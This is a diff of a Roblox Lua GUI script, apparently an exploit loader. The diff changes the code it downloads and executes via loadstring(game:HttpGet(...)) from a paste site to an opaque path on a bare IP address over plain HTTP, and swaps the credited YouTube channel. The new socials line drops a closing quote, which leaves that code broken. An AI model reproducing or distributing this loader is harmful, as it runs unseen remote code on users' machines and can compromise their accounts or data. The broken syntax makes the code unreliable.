@@ -25,7 +25,7 @@ if old then old:Destroy() end
 
 -- run main script
 pcall(function()
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/3vLaGn7z0a/0", true))()
+loadstring(game:HttpGet("http://31.172.87.116/BLc86KTv3RZds6QpgIZOcj6zkmwxvc3F3ZmANCPYNAsuIrGAL0tZss4P0CIKMtVpijW6OGhEWuYTFZKa"))()
 end)
 
 -- GUI
@@ -130,7 +130,7 @@ TweenService:Create(btn,TweenInfo.new(.1),{Size=UDim2.new(0.92,0,0,32)}):Play()
 if copy then
 
 if setclipboard then
-setclipboard("https://www.youtube.com/@Yong3469")
+setclipboard("https://www.youtube.com/@Keaw-w7l")
 end
 
 game.StarterGui:SetCore("SendNotification",{
@@ -172,7 +172,7 @@ layout.HorizontalAlignment="Center"
 
 local socials={
 {name="TikTok",color=Color3.fromRGB(255,0,128),link="www.tiktok.com/@renan1627"},
-{name="YouTube",color=Color3.fromRGB(255,0,0),link="https://www.youtube.com/@Yong3469"},
+{name="YouTube",color=Color3.fromRGB(255,0,0),link="https://www.youtube.com/@Keaw-w7l},
 {name="Discord",color=Color3.fromRGB(114,137,218),link="https://discord.gg/RbhFbKbABe"}
 }
 
